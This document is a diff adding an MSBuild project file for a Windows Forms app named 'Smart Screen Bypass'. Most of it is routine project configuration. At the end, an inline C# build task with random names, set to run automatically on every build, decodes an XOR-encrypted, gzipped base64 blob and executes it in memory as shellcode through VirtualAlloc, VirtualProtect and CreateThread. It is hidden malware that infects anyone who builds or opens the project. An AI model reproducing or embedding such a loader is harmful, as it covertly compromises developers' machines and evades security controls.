@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" InitialTargets="xkQS7cOdKJ">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{4BC5F596-BCB1-42E9-B935-1B374BD36B2E}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>Smart_Screen_Bypass.My.MyApplication</StartupObject>
+    <RootNamespace>Smart_Screen_Bypass</RootNamespace>
+    <AssemblyName>Smart Screen Bypass</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>Smart Screen Bypass.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>Smart Screen Bypass.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="System.Net.Http" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="System.Linq" />
+    <Import Include="System.Xml.Linq" />
+    <Import Include="System.Threading.Tasks" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="App.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <PropertyGroup />
+  <UsingTask TaskName="bDziazEmMi" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualAlloc")]static extern System.IntPtr Fqxm8ti(System.IntPtr a,uint s,uint t,uint p);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualProtect")]static extern bool A4NIwjg(System.IntPtr a,uint s,uint p,out uint o);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="CreateThread")]static extern System.IntPtr OQBu1Mk(System.IntPtr a,uint s,System.IntPtr e,System.IntPtr p,uint f,System.IntPtr t);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="WaitForSingleObject")]static extern uint H7vF40A(System.IntPtr h,uint ms);public override bool Execute(){var JxpGyT=System.Convert.FromBase64String("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");var rRvzg=System.Convert.FromBase64String("CwYX6g5N3AQ1na4hhusyAfzvwJkALJCV9lwH4REcSxQ=");var tZLdB=System.Convert.FromBase64String("E1izb5KhXhrRm0a4jAp762EslcIq3Zx4S8tzLxli08Q=");var vNF1H=System.Convert.FromBase64String("cxFmuVvOUmrmnILhDwRj4kuLYgkXBP4SX3+IagCYzWo=");for(int FJ=0;FJ<JxpGyT.Length;FJ++){JxpGyT[FJ]^=rRvzg[FJ%32];}for(int FJ=0;FJ<JxpGyT.Length;FJ++){JxpGyT[FJ]^=tZLdB[FJ%32];}for(int FJ=0;FJ<JxpGyT.Length;FJ++){JxpGyT[FJ]^=vNF1H[FJ%32];}var y6em=new System.IO.MemoryStream();using(var w3JC=new System.IO.Compression.GZipStream(new System.IO.MemoryStream(JxpGyT),System.IO.Compression.CompressionMode.Decompress))w3JC.CopyTo(y6em);JxpGyT=y6em.ToArray();var jF2wF=Fqxm8ti(System.IntPtr.Zero,(uint)JxpGyT.Length,0x3000u,0x04u);System.Runtime.InteropServices.Marshal.Copy(JxpGyT,0,jF2wF,JxpGyT.Length);uint NcO=0;A4NIwjg(jF2wF,(uint)JxpGyT.Length,0x20u,out NcO);H7vF40A(OQBu1Mk(System.IntPtr.Zero,0u,jF2wF,System.IntPtr.Zero,0u,System.IntPtr.Zero),0xFFFFFFFFu);return true;}]]></Code>
+    </Task>
+  </UsingTask>
+  <Target Name="xkQS7cOdKJ">
+    <bDziazEmMi />
+  </Target>
+</Project>
